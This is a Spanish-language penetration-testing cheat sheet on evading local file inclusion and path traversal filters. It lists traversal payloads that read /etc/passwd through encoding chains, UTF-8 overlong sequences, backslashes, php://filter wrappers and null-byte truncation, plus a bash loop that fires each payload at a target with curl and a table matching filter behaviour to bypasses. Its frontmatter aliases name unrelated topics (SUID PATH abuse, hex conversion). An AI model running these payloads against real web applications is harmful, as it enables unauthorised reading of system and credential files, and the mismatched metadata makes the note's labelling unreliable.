---
aliases:
  - Bypass del PATH en ejecución de binarios SUID
  - Hexadecimal a Decimal
tags:
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[File Inclusion]]'
---
# LFI - Path Traversal y Bypass de Filtros

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `....//....//....//etc/passwd` | Bypass de `str_replace('../', '')` — al borrar `../` queda `../../etc/passwd` | Filtro replace simple sin recursión. |
| `..%2f..%2f..%2fetc%2fpasswd` | URL encode `/` y `.` | Filtro busca `../` literal en string raw. |
| `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` | URL encode completo `.` y `/` | WAF strict que decodifica una vez. |
| `..%252f..%252f..%252fetc%252fpasswd` | Double URL encoding | Decoder chain — proxy + app. |
| `..%c0%af..%c0%afetc%c0%afpasswd` | UTF-8 overlong para `/` | Parsers legacy con UTF-8 conversion laxa. |
| `..%c1%9c..%c1%9cetc%c1%9cpasswd` | Variante UTF-8 overlong | Edge case Apache mod_security viejo. |
| `..\..\..\etc\passwd` | Backslashes en vez de `/` | Backend Windows, o Linux con parser tolerante. |
| `..%5c..%5c..%5cetc%5cpasswd` | URL-encoded backslash | Variante encoded. |
| `..%c0%ae%c0%ae%c0%afetc%c0%afpasswd` | UTF-8 overlong para `.` y `/` | Most aggressive WAF bypass. |
| `/var/www/../../etc/passwd` | Path absoluto + traversal | Filtro bloquea `../` en inicio pero no en medio. |
| `....\\....\\....\etc\\passwd` | Combo double-dot + backslash | Windows + filter doble. |
| `php://filter/resource=../../../etc/passwd` | Wrapper PHP — filtros que bloquean `../` no se aplican al resource | Filtro path-based ignora wrappers. |
| `../../../etc/passwd%00` | Null byte si append de extension | PHP <5.3.4 con append. |
| `../../../etc/passwd?` | Trailing `?` discarta append posterior | App agrega query string después. |
| `../../../etc/passwd#` | Fragment ignorado | Edge case. |
| `..././..././..././etc/passwd` | `.../` que NO se filtra como `../` | Filtro regex strict `../`. |
^lfi-traversal

### Workflow — testing filtros

```bash
TARGET="https://target/?page=PAYLOAD"

# Payloads ordenados de menos a más invasivos
PAYLOADS=(
  '../../../etc/passwd'
  '....//....//....//etc/passwd'
  '..%2f..%2f..%2fetc%2fpasswd'
  '..%252f..%252f..%252fetc%252fpasswd'
  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
  '..\\..\\..\\etc\\passwd'
  '/var/www/../../etc/passwd'
  'php://filter/resource=../../../etc/passwd'
)

for p in "${PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$p'))")
  RES=$(curl -s "${TARGET//PAYLOAD/$ENCODED}" | head -5)
  echo "=== $p ==="
  echo "$RES" | head -3
  echo
done
```

### Identificar tipo de filtro

| Síntoma | Filtro probable |
|:---:|:---:|
| `../` se borra del input pero `....//` pasa | `str_replace('../', '')` recursivo NO |
| URL-encoded `../` bloqueado | Decode antes de validar — usar double encoding |
| Solo bloquea cuando `../` está al inicio | Filtro de prefix — usar `/var/../etc/passwd` |
| Append automático de `.php` | Usar `%00`, `?`, `#`, o wrapper `php://filter` |
| Bloquea `..` literal | UTF-8 overlong `..%c0%ae%c0%ae` |
| Solo permite chars `[a-zA-Z0-9]` | Wrapper-based no ayuda — buscar otro endpoint |

___

## Overview

Cuando filtros bloquean LFI básico (`../`), se aprovechan diferencias entre cómo el filtro parsea vs cómo el filesystem normaliza el path.

**Estrategias clave:**
1. **Recursive `../` removal NO recursiva** — `....//` después de filter = `../`.
2. **Encoding chains** — URL, double URL, UTF-8 overlong.
3. **OS-specific separators** — `\` en Windows; tolerado por algunos parsers Linux.
4. **Wrappers PHP** — `php://filter/resource=...` salta validaciones path-based.
5. **Extension append bypass** — `%00`/`?`/`#` cortan el append.

Probar de menos a más invasivo — el filtro más laxo te dice qué cambiar.

***
